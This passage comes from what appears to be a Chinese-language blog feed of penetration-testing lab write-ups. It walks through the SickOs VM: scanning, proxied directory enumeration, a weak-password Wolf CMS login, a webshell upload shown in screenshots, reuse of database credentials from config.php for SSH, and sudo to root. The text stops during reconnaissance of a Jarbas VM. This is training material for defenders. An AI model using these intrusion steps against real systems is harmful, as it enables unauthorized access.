class="hljs-keyword">in</span> 1.966 seconds (130.21 hosts/sec). 4 responded<br><br></code></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>确定<code>192.168.80.156</code>为目标系统</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo masscan 192.168.80.156 -p 1-65535 --rate 10000<br>Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-11-17 01:49:54 GMT<br>Initiating SYN Stealth Scan<br>Scanning 1 hosts [65535 ports/host]<br>Discovered open port 3128/tcp on 192.168.80.156                                <br>Discovered open port 22/tcp on 192.168.80.156<br></code></pre></td></tr></table></figure><h3 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h3><p>发现<code>3128</code>为<code>Squid</code> http-proxy代理服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo nmap -sV -sC -p22,3128 -O 192.168.80.156      <br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-17 09:52 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.156<br>Host is up (0.0014s latency).<br><br>PORT     STATE SERVICE    VERSION<br>22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)<br>|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)<br>|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)<br>3128/tcp open  http-proxy Squid http proxy 3.1.19<br>|_http-title: ERROR: The requested URL could not be retrieved<br>|_http-server-header: squid/3.1.19<br>MAC Address: 00:0C:29:97:DA:AB (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9, Linux 4.4<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 33.54 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo nmap -sU -p22,3128 192.168.80.156<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-17 09:55 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.156<br>Host is up (0.00099s latency).<br><br>PORT     STATE         SERVICE<br>22/udp   open|filtered ssh<br>3128/udp open|filtered ndl-aas<br>MAC Address: 00:0C:29:97:DA:AB (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.41 seconds<br></code></pre></td></tr></table></figure><h3 id="基本漏扫"><a href="#基本漏扫" class="headerlink" title="基本漏扫"></a>基本漏扫</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,3128 192.168.80.156<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-17 09:56 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.80.156<br>Host is up (0.00068s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>3128/tcp open  squid-http<br>MAC Address: 00:0C:29:97:DA:AB (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.45 seconds<br><br></code></pre></td></tr></table></figure><h3 id="目录枚举"><a href="#目录枚举" class="headerlink" title="目录枚举"></a>目录枚举</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo dirb http://192.168.80.156:3128<br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Thu Nov 17 10:42:01 2022<br>URL_BASE: http://192.168.80.156:3128/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.80.156:3128/ ----<br>                                                                                                                                                    <br>-----------------<br>END_TIME: Thu Nov 17 10:42:13 2022<br>DOWNLOADED: 4612 - FOUND: 0<br><br></code></pre></td></tr></table></figure><h3 id="配置代理枚举目录"><a href="#配置代理枚举目录" class="headerlink" title="配置代理枚举目录"></a>配置代理枚举目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo dirb http://192.168.80.156 -p http://192.168.80.156:3128<br><br>-----------------<br>DIRB v2.22    <br>By The Dark Raver<br>-----------------<br><br>START_TIME: Thu Nov 17 10:44:05 2022<br>URL_BASE: http://192.168.80.156/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>PROXY: http://192.168.80.156:3128<br><br>-----------------<br><br>GENERATED WORDS: 4612                                                          <br><br>---- Scanning URL: http://192.168.80.156/ ----<br>+ http://192.168.80.156/cgi-bin/ (CODE:403|SIZE:290)                                                                                                <br>+ http://192.168.80.156/connect (CODE:200|SIZE:109)                                                                                                 <br>+ http://192.168.80.156/index (CODE:200|SIZE:21)                                                                                                    <br>+ http://192.168.80.156/index.php (CODE:200|SIZE:21)                                                                                                <br>+ http://192.168.80.156/robots (CODE:200|SIZE:45)                                                                                                   <br>+ http://192.168.80.156/robots.txt (CODE:200|SIZE:45)                                                                                               <br>+ http://192.168.80.156/server-status (CODE:403|SIZE:295)                                                                                           <br>                                                                                                                                                    <br>-----------------<br>END_TIME: Thu Nov 17 10:44:08 2022<br>DOWNLOADED: 4612 - FOUND: 7<br></code></pre></td></tr></table></figure><h3 id="查看robots"><a href="#查看robots" class="headerlink" title="查看robots"></a>查看robots</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ curl --proxy http://192.168.80.156:3128 http://192.168.80.156/robots<br>User-agent: *<br>Disallow: /<br>Dissalow: /wolfcms<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ curl --proxy http://192.168.80.156:3128 http://192.168.80.156/wolfcms<br>&lt;!DOCTYPE HTML PUBLIC <span class="hljs-string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;<br>&lt;html&gt;&lt;<span class="hljs-built_in">head</span>&gt;<br>&lt;title&gt;301 Moved Permanently&lt;/title&gt;<br>&lt;/head&gt;&lt;body&gt;<br>&lt;h1&gt;Moved Permanently&lt;/h1&gt;<br>&lt;p&gt;The document has moved &lt;a href=<span class="hljs-string">&quot;http://192.168.80.156/wolfcms/&quot;</span>&gt;here&lt;/a&gt;.&lt;/p&gt;<br>&lt;hr&gt;<br>&lt;address&gt;Apache/2.2.22 (Ubuntu) Server at 192.168.80.156 Port 80&lt;/address&gt;<br>&lt;/body&gt;&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><h3 id="找到真实web页面"><a href="#找到真实web页面" class="headerlink" title="找到真实web页面"></a>找到真实web页面</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221117105211326.png" alt="真实web页面"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221117105308428.png" alt="cms页面"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221117110147235.png" alt="弱密码登录后台"></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221117110554238.png" alt="上传webshell"></p><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221117110619530.png" alt="验证webshell"></p><h3 id="查看网站配置文件"><a href="#查看网站配置文件" class="headerlink" title="查看网站配置文件"></a>查看网站配置文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs php">www-data@SickOs:/<span class="hljs-keyword">var</span>/www/wolfcms$ cat config.php<br>cat config.php<br><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-comment">// Database information:</span><br><span class="hljs-comment">// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)</span><br><span class="hljs-comment">// The path can only be absolute path or :memory:</span><br><span class="hljs-comment">// For more info look at: www.php.net/pdo</span><br><br><span class="hljs-comment">// Database settings:</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DB_DSN&#x27;</span>, <span class="hljs-string">&#x27;mysql:dbname=wolf;host=localhost;port=3306&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DB_USER&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DB_PASS&#x27;</span>, <span class="hljs-string">&#x27;john@123&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;TABLE_PREFIX&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><br><span class="hljs-comment">// Should Wolf produce PHP error messages for debugging?</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DEBUG&#x27;</span>, <span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// Should Wolf check for updates on Wolf itself and the installed plugins?</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;CHECK_UPDATES&#x27;</span>, <span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// The number of seconds before the check for a new Wolf version times out in case of problems.</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;CHECK_TIMEOUT&#x27;</span>, <span class="hljs-number">3</span>);<br><br><span class="hljs-comment">// The full URL of your Wolf CMS install</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;URL_PUBLIC&#x27;</span>, <span class="hljs-string">&#x27;/wolfcms/&#x27;</span>);<br><br><span class="hljs-comment">// Use httpS for the backend?</span><br><span class="hljs-comment">// Before enabling this, please make sure you have a working HTTP+SSL installation.</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;USE_HTTPS&#x27;</span>, <span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// Use HTTP ONLY setting for the Wolf CMS authentication cookie?</span><br><span class="hljs-comment">// This requests browsers to make the cookie only available through HTTP, so not javascript for example.</span><br><span class="hljs-comment">// Defaults to false for backwards compatibility.</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;COOKIE_HTTP_ONLY&#x27;</span>, <span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// The virtual directory name for your Wolf CMS administration section.</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;ADMIN_DIR&#x27;</span>, <span class="hljs-string">&#x27;admin&#x27;</span>);<br><br><span class="hljs-comment">// Change this setting to enable mod_rewrite. Set to &quot;true&quot; to remove the &quot;?&quot; in the URL.</span><br><span class="hljs-comment">// To enable mod_rewrite, you must also change the name of &quot;_.htaccess&quot; in your</span><br><span class="hljs-comment">// Wolf CMS root directory to &quot;.htaccess&quot;</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;USE_MOD_REWRITE&#x27;</span>, <span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// Add a suffix to pages (simluating static pages &#x27;.html&#x27;)</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;URL_SUFFIX&#x27;</span>, <span class="hljs-string">&#x27;.html&#x27;</span>);<br><br><span class="hljs-comment">// Set the timezone of your choice.</span><br><span class="hljs-comment">// Go here for more information on the available timezones:</span><br><span class="hljs-comment">// http://php.net/timezones</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DEFAULT_TIMEZONE&#x27;</span>, <span class="hljs-string">&#x27;Asia/Calcutta&#x27;</span>);<br><br><span class="hljs-comment">// Use poormans cron solution instead of real one.</span><br><span class="hljs-comment">// Only use if cron is truly not available, this works better in terms of timing</span><br><span class="hljs-comment">// if you have a lot of traffic.</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;USE_POORMANSCRON&#x27;</span>, <span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// Rough interval in seconds at which poormans cron should trigger.</span><br><span class="hljs-comment">// No traffic == no poormans cron run.</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;POORMANSCRON_INTERVAL&#x27;</span>, <span class="hljs-number">3600</span>);<br><br><span class="hljs-comment">// How long should the browser remember logged in user?</span><br><span class="hljs-comment">// This relates to Login screen &quot;Remember me for xxx time&quot; checkbox at Backend Login screen</span><br><span class="hljs-comment">// Default: 1800 (30 minutes)</span><br><span class="hljs-title function_ invoke__">define</span> (<span class="hljs-string">&#x27;COOKIE_LIFE&#x27;</span>, <span class="hljs-number">1800</span>);  <span class="hljs-comment">// 30 minutes</span><br><br><span class="hljs-comment">// Can registered users login to backend using their email address?</span><br><span class="hljs-comment">// Default: false</span><br><span class="hljs-title function_ invoke__">define</span> (<span class="hljs-string">&#x27;ALLOW_LOGIN_WITH_EMAIL&#x27;</span>, <span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">// Should Wolf CMS block login ability on invalid password provided?</span><br><span class="hljs-comment">// Default: true</span><br><span class="hljs-title function_ invoke__">define</span> (<span class="hljs-string">&#x27;DELAY_ON_INVALID_LOGIN&#x27;</span>, <span class="hljs-literal">true</span>);<br><br><span class="hljs-comment">// How long should the login blockade last?</span><br><span class="hljs-comment">// Default: 30 seconds</span><br><span class="hljs-title function_ invoke__">define</span> (<span class="hljs-string">&#x27;DELAY_ONCE_EVERY&#x27;</span>, <span class="hljs-number">30</span>); <span class="hljs-comment">// 30 seconds</span><br><br><span class="hljs-comment">// First delay starts after Nth failed login attempt</span><br><span class="hljs-comment">// Default: 3</span><br><span class="hljs-title function_ invoke__">define</span> (<span class="hljs-string">&#x27;DELAY_FIRST_AFTER&#x27;</span>, <span class="hljs-number">3</span>);<br><br><span class="hljs-comment">// Secure token expiry time (prevents CSRF attacks, etc.)</span><br><span class="hljs-comment">// If backend user does nothing for this time (eg. click some link) </span><br><span class="hljs-comment">// his token will expire with appropriate notification</span><br><span class="hljs-comment">// Default: 900 (15 minutes)</span><br><span class="hljs-title function_ invoke__">define</span> (<span class="hljs-string">&#x27;SECURE_TOKEN_EXPIRY&#x27;</span>, <span class="hljs-number">900</span>);  <span class="hljs-comment">// 15 minutes</span><br><br></code></pre></td></tr></table></figure><h3 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h3><p>通过网站配置文件，猜测用户密码和数据库密码一致</p><p>所以通过sickos:john@123尝试登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ ssh sickos@192.168.80.156<br>The authenticity of host <span class="hljs-string">&#x27;192.168.80.156 (192.168.80.156)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ECDSA key fingerprint is SHA256:fBxcsD9oGyzCgdxtn34OtTEDXIW4E9/RlkxombNm0y8.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.80.156<span class="hljs-string">&#x27; (ECDSA) to the list of known hosts.</span><br><span class="hljs-string">sickos@192.168.80.156&#x27;</span>s password: <br>Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)<br><br> * Documentation:  https://help.ubuntu.com/<br><br>  System information as of Thu Nov 17 09:01:41 IST 2022<br><br>  System load:  0.0               Processes:           124<br>  Usage of /:   4.3% of 28.42GB   Users logged <span class="hljs-keyword">in</span>:     0<br>  Memory usage: 12%               IP address <span class="hljs-keyword">for</span> eth0: 192.168.80.156<br>  Swap usage:   0%<br><br>  Graph this data and manage this system at:<br>    https://landscape.canonical.com/<br><br>124 packages can be updated.<br>92 updates are security updates.<br><br>New release <span class="hljs-string">&#x27;14.04.3 LTS&#x27;</span> available.<br>Run <span class="hljs-string">&#x27;do-release-upgrade&#x27;</span> to upgrade to it.<br><br>Last login: Tue Sep 22 08:32:44 2015<br></code></pre></td></tr></table></figure><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">sickos@SickOs:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> sickos: <br>Matching Defaults entries <span class="hljs-keyword">for</span> sickos on this host:<br>    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User sickos may run the following commands on this host:<br>    (ALL : ALL) ALL<br>sickos@SickOs:~$ sudo -s<br>root@SickOs:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h3><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/image-20221117122923847.png" alt="拿到flag"></p>]]></content>
    
    
    <categories>
      
      <category>WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OSCP</tag>
      
      <tag>打靶</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Jarbas-WP</title>
    <link href="/2022/11/16/Jarbas-WP/"/>
    <url>/2022/11/16/Jarbas-WP/</url>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p><code>sudo arp-scan -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo arp-scan -l<br>[sudo] password <span class="hljs-keyword">for</span> neil:<br>Interface: eth0, <span class="hljs-built_in">type</span>: EN10MB, MAC: 00:0c:29:b7:34:fa, IPv4: 192.168.204.128<br>Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)<br>192.168.204.1   00:50:56:c0:00:08       VMware, Inc.<br>192.168.204.2   00:50:56:f1:2d:aa       VMware, Inc.<br>192.168.204.131 00:0c:29:77:bf:92       VMware, Inc.<br>192.168.204.254 00:50:56:e7:e4:2a       VMware, Inc.<br><br>6 packets received by filter, 0 packets dropped by kernel<br>Ending arp-scan 1.9.8: 256 hosts scanned <span class="hljs-keyword">in</span> 2.055 seconds (124.57 hosts/sec). 4 responded<br><br></code></pre></td></tr></table></figure><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>全端口扫描: <code>sudo nmap --min-rate 10000 -p- 192.168.204.131</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.204.131<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-16 21:50 CST<br>Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 36.52% <span class="hljs-keyword">done</span>; ETC: 21:51 (0:00:16 remaining)<br>Stats: 0:00:42 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan<br>SYN Stealth Scan Timing: About 99.99% <span class="hljs-keyword">done</span>; ETC: 21:51 (0:00:00 remaining)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.204.131<br>Host is up (0.00071s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>3306/tcp open  mysql<br>8080/tcp open  http-proxy<br>MAC Address: 00:0C:29:77:BF:92 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 48.91 seconds<br><br></code></pre></td></tr></table></figure><p>TCP端口扫描: <code>sudo nmap -sT -sV -O -p22,80,3306,8080 192.168.204.131</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(neil㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -O -p22,80,3306,8080 192.168.204.131<br>Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-16 21:52 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.204.131<br>Host is up (0.0011s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)<br>80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)<br>3306/tcp open  mysql   MariaDB (unauthorized)<br>8080/tcp open  http    Jetty 9.4.z-SNAPSHOT<br>MAC Address: 00:0C:29:77:BF:92 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.37 seconds<br><br></code></pre></td></tr></table></figure><p>UDP端口扫描: <code>sudo nmap -sU -p22,80,3306,8080 192.168.204.131</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 